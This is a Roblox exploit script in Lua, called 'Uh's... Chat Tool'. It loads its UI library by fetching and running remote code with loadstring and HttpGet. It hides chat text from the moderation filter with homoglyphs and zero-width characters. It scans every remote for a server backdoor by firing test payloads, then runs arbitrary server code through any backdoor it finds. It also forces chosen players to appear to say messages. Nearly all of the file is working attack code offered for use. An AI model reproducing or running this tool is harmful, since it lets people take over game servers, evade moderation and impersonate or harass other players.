--[[
    Uh's... Chat Tool v3.1 - Silent Edition (English)
    - Display obfuscated chat bubbles above any player.
    - Improved player search (Name / DisplayName, partial matches).
    - Robust backdoor scanner with dummy‑instance verification.
    - Optionally force a target player to "say" something via backdoor.
--]]

-- ========================================================================= --
--                            1. CONFIGURATION                              --
-- ========================================================================= --
local CONFIG = {
    UI = {
        Theme = "Default",
        SaveConfig = true,
        FolderName = "UhsChat",
        FileName = "Settings"
    },
    Bypass = {
        Method = "Advanced" -- "Homoglyph", "ZeroWidth", "Combined", "Advanced"
    },
    Backdoor = {
        AutoScan = true,
        UseBubbleFallback = true,
        ScanTimeout = 30,       -- seconds max waiting for dummy response
        DelayFactor = 2.5       -- multiplier based on ping
    }
}

-- ========================================================================= --
--                    2. LOAD RAYFIELD (MULTIPLE MIRRORS)                   --
-- ========================================================================= --
local Rayfield = nil
local rayfieldSources = {
    'https://sirius.menu/rayfield',
    'https://raw.githubusercontent.com/shlexware/Rayfield/main/source',
    'https://pastebin.com/raw/jiBxV7iB'
}

for _, url in ipairs(rayfieldSources) do
    local success, result = pcall(function()
        return loadstring(game:HttpGet(url))()
    end)
    if success and result then
        Rayfield = result
        break
    end
end

if not Rayfield then
    warn("Rayfield unavailable. Running in console mode.")
    Rayfield = {
        Notify = function(d) print("[NOTIFY]", d.Title, d.Content) end,
        CreateWindow = function() return {
            CreateTab = function() return {
                CreateSection = function() end,
                CreateInput = function() return { Set = function() end } end,
                CreateButton = function() end,
                CreateDropdown = function() return { Set = function() end, Refresh = function() end } end,
                CreateParagraph = function() return { Set = function() end } end,
                CreateToggle = function() end,
                CreateSlider = function() return { Set = function() end } end
            } end
        } end
    }
end

-- ========================================================================= --
--                            3. SERVICES                                   --
-- ========================================================================= --
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Chat = game:GetService("Chat")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

-- ========================================================================= --
--                      4. ADVANCED BYPASS ENGINE                           --
-- ========================================================================= --
local BypassEngine = {}
BypassEngine.__index = BypassEngine

local HOMOGLYPH_MAP = {
    a = "а", c = "с", e = "е", o = "о", p = "р", x = "х", y = "у",
    k = "к", m = "м", t = "т", h = "һ", b = "Ь",
    A = "А", B = "В", C = "С", E = "Е", H = "Н", I = "І", J = "Ј",
    K = "К", M = "М", O = "О", P = "Р", T = "Т", X = "Х", Y = "Ү",
    a2 = "α", e2 = "ε", o2 = "ο", p2 = "ρ", c2 = "ϲ", x2 = "χ", y2 = "γ",
    A2 = "Α", B2 = "Β", E2 = "Ε", H2 = "Η", I2 = "Ι", K2 = "Κ", M2 = "Μ",
    a3 = "ա", e3 = "ե", o3 = "օ", p3 = "р", c3 = "с"
}
local ZWSP = "\u{200B}"

function BypassEngine.new(method)
    local self = setmetatable({}, BypassEngine)
    self.Method = method or "Advanced"
    return self
end

function BypassEngine:applyHomoglyph(text)
    return text:gsub("%a", function(c) return HOMOGLYPH_MAP[c] or c end)
end

function BypassEngine:applyZeroWidth(text)
    local chars = {}
    for i = 1, #text do
        table.insert(chars, text:sub(i, i))
        if i < #text and math.random() > 0.6 then
            table.insert(chars, ZWSP)
        end
    end
    return table.concat(chars)
end

function BypassEngine:applyCombined(text)
    return self:applyZeroWidth(self:applyHomoglyph(text))
end

function BypassEngine:applyAdvanced(text)
    local bypassed = text:gsub("%a", function(c)
        if math.random() > 0.5 then
            local vars = {HOMOGLYPH_MAP[c], HOMOGLYPH_MAP[c.."2"], HOMOGLYPH_MAP[c.."3"]}
            for _, v in ipairs(vars) do if v then return v end end
        end
        return c
    end)
    bypassed = bypassed:gsub("([a-zA-Z])([a-zA-Z])", function(c1, c2)
        return math.random() > 0.7 and c1 .. ZWSP .. c2 or c1 .. c2
    end)
    return bypassed
end

function BypassEngine:Process(text)
    local methods = {
        Homoglyph = self.applyHomoglyph,
        ZeroWidth = self.applyZeroWidth,
        Combined = self.applyCombined,
        Advanced = self.applyAdvanced
    }
    local func = methods[self.Method] or self.applyAdvanced
    return func(self, text)
end

-- ========================================================================= --
--                        5. BUBBLE MANAGER                                 --
-- ========================================================================= --
local BubbleManager = {}
BubbleManager.__index = BubbleManager

function BubbleManager.new(bypassEngine)
    local self = setmetatable({}, BubbleManager)
    self.Bypass = bypassEngine
    return self
end

function BubbleManager:DisplayForPlayer(player, message)
    if not player or not player:IsA("Instance") then return false end
    local processed = self.Bypass:Process(message)
    
    local character = player.Character
    if not character then return false end
    
    local head = character:FindFirstChild("Head")
    if not head then return false end
    
    local success = pcall(function()
        TextChatService:DisplayBubble(head, processed)
    end)
    return success
end

function BubbleManager:DisplayForSelf(message)
    return self:DisplayForPlayer(LocalPlayer, message)
end

-- ========================================================================= --
--                   6. ROBUST BACKDOOR SCANNER (inspired by backdoor.exe)  --
-- ========================================================================= --
local BackdoorScanner = {}
BackdoorScanner.__index = BackdoorScanner

function BackdoorScanner.new(bypassEngine)
    local self = setmetatable({}, BackdoorScanner)
    self.Bypass = bypassEngine
    self.WorkingGateway = nil       -- stores {Remote, ExecuteFunction}
    self.AllRemotes = {}
    return self
end

-- Collect all RemoteEvent / RemoteFunction instances, including nil instances if supported
function BackdoorScanner:CollectRemotes()
    local remotes = {}
    local function scan(obj, depth)
        if depth > 15 then return end
        for _, child in ipairs(obj:GetChildren()) do
            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                table.insert(remotes, child)
            end
            scan(child, depth + 1)
        end
    end
    scan(game, 0)

    -- Also check common parent paths
    local common = {
        ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"),
        ReplicatedStorage:FindFirstChild("ChatService"),
        game:FindFirstChild("Chat"),
        game:FindFirstChild("ServerScriptService")
    }
    for _, container in ipairs(common) do
        if container then
            for _, child in ipairs(container:GetDescendants()) do
                if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                    if not table.find(remotes, child) then
                        table.insert(remotes, child)
                    end
                end
            end
        end
    end

    -- Support for getnilinstances (if available)
    if getnilinstances then
        for _, inst in ipairs(getnilinstances()) do
            if inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction") then
                table.insert(remotes, inst)
            end
        end
    end

    self.AllRemotes = remotes
    return remotes
end

-- Generate a unique random name (alphanumeric + symbols) that doesn't exist in Workspace
function BackdoorScanner:GenerateUniqueName()
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=[]{}|;:,./?"
    local name
    repeat
        name = ""
        for _ = 1, 8 do
            local idx = math.random(1, #chars)
            name = name .. chars:sub(idx, idx)
        end
    until not Workspace:FindFirstChild(name)
    return name
end

-- Dummy payload that creates a BoolValue in Workspace with the unique name
local DUMMY_PAYLOAD = [[
local dummy = Instance.new("BoolValue")
dummy.Name = "%s"
dummy.Parent = workspace
game:GetService("Debris"):AddItem(dummy, 5)
]]

-- Scan all remotes, sending a dummy creation payload and listening for response
function BackdoorScanner:Scan(timeout, delayFactor)
    timeout = timeout or CONFIG.Backdoor.ScanTimeout
    delayFactor = delayFactor or CONFIG.Backdoor.DelayFactor

    local remotes = self:CollectRemotes()
    if #remotes == 0 then
        return nil, "No remotes found to test."
    end

    local connection
    local foundGateway = nil
    local dummyName = self:GenerateUniqueName()
    local payload = DUMMY_PAYLOAD:format(dummyName)

    -- Listen for the dummy instance to appear
    connection = Workspace.ChildAdded:Connect(function(child)
        if child.Name == dummyName then
            foundGateway = self.WorkingGateway  -- set by the solver when sending
            connection:Disconnect()
        end
    end)

    -- Define solver: for each remote, attempt to fire with the payload
    local function testRemote(remote)
        local success, err = pcall(function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer(payload)
            else
                remote:FireServer(payload)
            end
        end)
        if success then
            -- If no error, mark this remote as a candidate
            self.WorkingGateway = {
                Remote = remote,
                Execute = function(code)
                    if remote:IsA("RemoteFunction") then
                        remote:InvokeServer(code)
                    else
                        remote:FireServer(code)
                    end
                end
            }
        end
    end

    -- Test all remotes (spawn each in a separate thread to avoid yielding)
    for _, remote in ipairs(remotes) do
        task.spawn(testRemote, remote)
    end

    -- Calculate timeout based on ping and number of remotes
    local ping = LocalPlayer:GetNetworkPing()
    local dynamicTimeout = math.max(ping * delayFactor * #remotes, timeout)
    local endTime = tick() + dynamicTimeout

    -- Wait for connection to be triggered or timeout
    while connection.Connected and tick() < endTime do
        task.wait()
    end
    connection:Disconnect()

    if foundGateway then
        self.WorkingGateway = foundGateway
        return foundGateway, "Backdoor found: " .. foundGateway.Remote:GetFullName()
    else
        self.WorkingGateway = nil
        return nil, "No backdoor responded after testing " .. #remotes .. " remotes."
    end
end

-- Execute arbitrary code on the server via the found backdoor
function BackdoorScanner:Execute(code)
    if not self.WorkingGateway then
        return false, "No working backdoor available."
    end
    local success, err = pcall(function()
        self.WorkingGateway.Execute(code)
    end)
    return success, err
end

-- Force a target player to say a message (bypass applied)
function BackdoorScanner:ForceSay(player, message)
    if not self.WorkingGateway then
        return false, "No backdoor available."
    end
    if not player or not player:IsA("Instance") then
        return false, "Invalid player."
    end

    local processed = self.Bypass:Process(message)
    -- Server-side script to make player chat (works for legacy Chat and TextChatService)
    local scriptToRun = string.format([[
        local target = game:GetService("Players"):FindFirstChild("%s")
        if target then
            local chatService = game:GetService("Chat")
            local textChatService = game:GetService("TextChatService")
            local message = "%s"
            -- Legacy chat
            if chatService and chatService:FindFirstChild("ChatWindow") then
                local chatWindow = chatService:FindFirstChild("ChatWindow")
                if chatWindow then
                    -- Simulate chat
                    local replicatedStorage = game:GetService("ReplicatedStorage")
                    local sayMessageRequest = replicatedStorage:FindFirstChild("SayMessageRequest", true)
                    if sayMessageRequest then
                        sayMessageRequest:FireServer(message, "All")
                    else
                        -- Fallback: use Chat:Chat()
                        chatService:Chat(target.Character.Head, message, "Blue")
                    end
                end
            end
            -- TextChatService (new system)
            if textChatService then
                local textChannel = textChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
                if textChannel then
                    textChannel:DisplaySystemMessage(message, target.Name)
                end
            end
        end
    ]], player.Name, processed:gsub('"', '\\"'))

    local success, err = self:Execute(scriptToRun)
    if not success then
        -- Fallback to bubble if enabled
        if CONFIG.Backdoor.UseBubbleFallback then
            local bubbleOk = BubbleManager:DisplayForPlayer(player, message)
            if bubbleOk then
                return true, "Backdoor failed, but bubble displayed."
            end
        end
        return false, "Execution failed: " .. tostring(err)
    end
    return true, "Message forced via backdoor."
end

-- ========================================================================= --
--                            7. UI CONSTRUCTION                            --
-- ========================================================================= --
local Window = Rayfield:CreateWindow({
    Name = "Uh's... Chat Tool v3.1",
    LoadingTitle = "Uh's... Chat",
    LoadingSubtitle = "Silent Edition",
    Theme = CONFIG.UI.Theme,
    ConfigurationSaving = {
        Enabled = CONFIG.UI.SaveConfig,
        FolderName = CONFIG.UI.FolderName,
        FileName = CONFIG.UI.FileName
    },
    Discord = { Enabled = false },
    KeySystem = false
})

-- ========================================================================= --
--                          8. INITIALIZATION                               --
-- ========================================================================= --
local Bypass = BypassEngine.new(CONFIG.Bypass.Method)
local BubbleMgr = BubbleManager.new(Bypass)
local Scanner = BackdoorScanner.new(Bypass)

local CurrentMessage = ""
local TargetPlayer = nil
local TargetName = ""

-- Auto-scan on startup if enabled
if CONFIG.Backdoor.AutoScan then
    task.spawn(function()
        local gateway, msg = Scanner:Scan()
        if gateway then
            Rayfield:Notify({
                Title = "Backdoor Scanner",
                Content = msg,
                Duration = 5
            })
        else
            Rayfield:Notify({
                Title = "Backdoor Scanner",
                Content = msg,
                Duration = 5
            })
        end
    end)
end

-- ========================================================================= --
--                           9. TABS & ELEMENTS                             --
-- ========================================================================= --
local ChatTab = Window:CreateTab("Chat", "message-square")
local SettingsTab = Window:CreateTab("Settings", "settings")

-- Preview update function
local function UpdatePreview(para)
    if CurrentMessage ~= "" then
        para:Set({Title = "Obfuscated Preview", Content = Bypass:Process(CurrentMessage)})
    else
        para:Set({Title = "Obfuscated Preview", Content = "..."})
    end
end

-- ========================================================================= --
--                           CHAT TAB                                       --
-- ========================================================================= --
ChatTab:CreateSection("Message Input")
local MsgInput = ChatTab:CreateInput({
    Name = "Your Message",
    PlaceholderText = "Type here...",
    RemoveTextAfterFocus = false,
    Callback = function(text) CurrentMessage = text or "" end
})

ChatTab:CreateSection("Bypass Preview")
local PreviewPara = ChatTab:CreateParagraph({Title = "Obfuscated Preview", Content = "..."})
ChatTab:CreateButton({
    Name = "Refresh Preview",
    Callback = function() UpdatePreview(PreviewPara) end
})

ChatTab:CreateSection("Bubble Actions")
ChatTab:CreateButton({
    Name = "Display Bubble on Yourself",
    Callback = function()
        if CurrentMessage == "" then
            Rayfield:Notify({Title = "Error", Content = "Please enter a message.", Duration = 3})
            return
        end
        local ok = BubbleMgr:DisplayForSelf(CurrentMessage)
        if ok then
            Rayfield:Notify({Title = "Success", Content = "Bubble displayed above you!", Duration = 2})
        else
            Rayfield:Notify({Title = "Failure", Content = "Could not display bubble.", Duration = 3})
        end
    end
})

-- ========================================================================= --
--                  PLAYER SEARCH (AUTO-FILTER)                              --
-- ========================================================================= --
ChatTab:CreateSection("Target Selection (Partial Match)")

local SearchInput = ChatTab:CreateInput({
    Name = "Search by Name or DisplayName",
    PlaceholderText = "Type to filter...",
    RemoveTextAfterFocus = false,
    Callback = function(text) end -- we'll handle via manual update
})

local PlayerDropdown = ChatTab:CreateDropdown({
    Name = "Select Target",
    Options = {"(type above to search)"},
    CurrentOption = nil,
    Callback = function(opt)
        local selected = type(opt) == "table" and opt[1] or opt
        if selected and selected ~= "(type above to search)" and selected ~= "(no matches)" then
            TargetPlayer = Players:FindFirstChild(selected)
            TargetName = selected
        else
            TargetPlayer = nil
            TargetName = ""
        end
        UpdateTargetInfo()
    end
})

local TargetInfoPara = ChatTab:CreateParagraph({Title = "Current Target", Content = "None"})

function UpdateTargetInfo()
    if TargetPlayer then
        TargetInfoPara:Set({
            Title = "Selected Target",
            Content = string.format("%s (@%s) | ID: %d", TargetPlayer.Name, TargetPlayer.DisplayName, TargetPlayer.UserId)
        })
    elseif TargetName ~= "" then
        TargetInfoPara:Set({Title = "Target (Offline?)", Content = TargetName .. " - Not found online."})
    else
        TargetInfoPara:Set({Title = "Current Target", Content = "None"})
    end
end

-- Filter players based on search text (case-insensitive partial match on Name or DisplayName)
local function FilterPlayers(searchText)
    local matches = {}
    local lowerSearch = searchText:lower()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            if player.Name:lower():find(lowerSearch, 1, true) or player.DisplayName:lower():find(lowerSearch, 1, true) then
                table.insert(matches, player.Name)
            end
        end
    end
    if #matches == 0 then
        return {"(no matches)"}
    end
    table.sort(matches)
    return matches
end

-- Connect search input to dropdown refresh
local lastSearchText = ""
local function OnSearchTextChanged()
    local text = SearchInput.CurrentValue or ""
    if text == lastSearchText then return end
    lastSearchText = text
    local options = FilterPlayers(text)
    PlayerDropdown:Refresh(options, true)
    -- Auto-select first if only one match and it's a real player
    if #options == 1 and options[1] ~= "(no matches)" then
        TargetPlayer = Players:FindFirstChild(options[1])
        TargetName = options[1]
        UpdateTargetInfo()
    end
end

-- We need to poll the input value since Rayfield input callback only fires on focus loss.
-- Use a heartbeat connection.
game:GetService("RunService").Heartbeat:Connect(function()
    if SearchInput and SearchInput.CurrentValue ~= lastSearchText then
        OnSearchTextChanged()
    end
end)

-- Manual refresh button
ChatTab:CreateButton({
    Name = "Refresh Player List",
    Callback = function()
        local text = SearchInput.CurrentValue or ""
        local options = FilterPlayers(text)
        PlayerDropdown:Refresh(options, true)
        Rayfield:Notify({Title = "Player List", Content = "List updated.", Duration = 2})
    end
})

-- Auto-refresh when players join/leave
Players.PlayerAdded:Connect(function()
    task.wait(0.5)
    OnSearchTextChanged()
end)
Players.PlayerRemoving:Connect(function()
    task.wait(0.5)
    OnSearchTextChanged()
end)

-- Initialize with all players
task.spawn(function()
    task.wait(0.5)
    OnSearchTextChanged()
end)

-- ========================================================================= --
--                     ACTIONS ON OTHER PLAYERS                             --
-- ========================================================================= --
ChatTab:CreateSection("Actions on Target")

ChatTab:CreateButton({
    Name = "Display Bubble on Target (Visual)",
    Callback = function()
        if CurrentMessage == "" then
            Rayfield:Notify({Title = "Error", Content = "Enter a message first.", Duration = 3})
            return
        end
        if not TargetPlayer then
            Rayfield:Notify({Title = "Error", Content = "Select a target first.", Duration = 3})
            return
        end
        local ok = BubbleMgr:DisplayForPlayer(TargetPlayer, CurrentMessage)
        if ok then
            Rayfield:Notify({Title = "Success", Content = "Bubble displayed on " .. TargetPlayer.Name, Duration = 2})
        else
            Rayfield:Notify({Title = "Failure", Content = "Could not display bubble.", Duration = 3})
        end
    end
})

ChatTab:CreateButton({
    Name = "Force Target to Say (Backdoor)",
    Callback = function()
        if CurrentMessage == "" then
            Rayfield:Notify({Title = "Error", Content = "Enter a message first.", Duration = 3})
            return
        end
        if not TargetPlayer then
            Rayfield:Notify({Title = "Error", Content = "Select a target first.", Duration = 3})
            return
        end
        if not Scanner.WorkingGateway then
            -- Attempt a quick scan
            Rayfield:Notify({Title = "Backdoor", Content = "No backdoor cached. Scanning...", Duration = 3})
            local gateway, msg = Scanner:Scan()
            if not gateway then
                Rayfield:Notify({Title = "Scan Failed", Content = msg, Duration = 5})
                return
            else
                Rayfield:Notify({Title = "Backdoor Found", Content = msg, Duration = 3})
            end
        end
        local success, info = Scanner:ForceSay(TargetPlayer, CurrentMessage)
        if success then
            Rayfield:Notify({Title = "Backdoor Success", Content = info, Duration = 5})
        else
            Rayfield:Notify({Title = "Backdoor Failed", Content = info, Duration = 5})
        end
    end
})

ChatTab:CreateParagraph({
    Title = "Note",
    Content = "Force Say uses a server backdoor. If none works, bubble fallback will display visually."
})

-- ========================================================================= --
--                           SETTINGS TAB                                   --
-- ========================================================================= --
SettingsTab:CreateSection("Bypass Method")
SettingsTab:CreateDropdown({
    Name = "Method",
    Options = {"Homoglyph", "ZeroWidth", "Combined", "Advanced"},
    CurrentOption = CONFIG.Bypass.Method,
    Callback = function(opt)
        local method = type(opt) == "table" and opt[1] or opt
        Bypass.Method = method
        CONFIG.Bypass.Method = method
        Rayfield:Notify({Title = "Bypass", Content = "Method changed to " .. method, Duration = 2})
    end
})

SettingsTab:CreateSection("Backdoor Scanner")
SettingsTab:CreateToggle({
    Name = "Auto-Scan on Startup",
    CurrentValue = CONFIG.Backdoor.AutoScan,
    Callback = function(val) CONFIG.Backdoor.AutoScan = val end
})
SettingsTab:CreateToggle({
    Name = "Use Bubble Fallback",
    CurrentValue = CONFIG.Backdoor.UseBubbleFallback,
    Callback = function(val) CONFIG.Backdoor.UseBubbleFallback = val end
})
SettingsTab:CreateButton({
    Name = "Re-scan for Backdoors",
    Callback = function()
        Rayfield:Notify({Title = "Scanning", Content = "Searching for backdoors...", Duration = 2})
        task.spawn(function()
            local gateway, msg = Scanner:Scan()
            if gateway then
                Rayfield:Notify({Title = "Scan Complete", Content = msg, Duration = 5})
            else
                Rayfield:Notify({Title = "Scan Failed", Content = msg, Duration = 5})
            end
        end)
    end
})

SettingsTab:CreateSlider({
    Name = "Scan Timeout (seconds)",
    Range = {5, 60},
    Increment = 1,
    CurrentValue = CONFIG.Backdoor.ScanTimeout,
    Callback = function(val) CONFIG.Backdoor.ScanTimeout = val end
})
SettingsTab:CreateSlider({
    Name = "Delay Factor",
    Range = {1, 5},
    Increment = 0.5,
    CurrentValue = CONFIG.Backdoor.DelayFactor,
    Callback = function(val) CONFIG.Backdoor.DelayFactor = val end
})

-- ========================================================================= --
--                            10. FINALIZE                                  --
-- ========================================================================= --
Rayfield:Notify({
    Title = "Uh's... Chat Tool v3.1",
    Content = "Loaded! Use the search to find players, then display bubbles or force chat.",
    Duration = 6
})